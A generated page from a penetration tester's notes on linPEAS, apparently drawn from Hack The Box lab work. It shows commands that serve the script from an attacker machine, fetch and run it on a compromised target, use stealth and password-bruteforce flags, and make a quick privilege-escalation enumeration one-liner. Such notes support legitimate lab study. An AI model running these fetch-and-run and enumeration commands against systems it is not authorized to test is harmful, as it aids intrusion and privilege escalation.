---
title: "linPEAS"
sidebarTitle: "linPEAS"
description: "Commands and examples collected from your linPEAS notes."
keywords: ["linPEAS", "linpeas.sh"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/linpeas.md. Edit the Markdown source, then run scripts/sync_site.py. */}

[Search this tool’s saved examples](/commands/notebook?tool=linpeas) · [All tools](/index)

## Enumeration (post-foothold)

**Notebook example**

```bash
# Attacker
python3 -m http.server 8080

# Target
wget http://10.10.14.174:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Saved as written; may include lab values or terminal output.

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

3 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="Enumeration (post-foothold)">

### Enumeration (post-foothold)

**HTB Box Note Template**

```bash
# linpeas / winpeas / pspy / whoami /all etc.
```

</Accordion>

<Accordion title="Tools">

### Tools

**Linux Privilege Escalation: Full Checklist**

```powershell
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
```

</Accordion>

<Accordion title="Quick-start command cheat (run first, always)">

### Quick-start command cheat (run first, always)

**Privilege Escalation: Choose a Checklist**

```bash
# 1. Automated
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out

# 2. Manual "big 6"
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; uname -a
```

</Accordion>

</AccordionGroup>
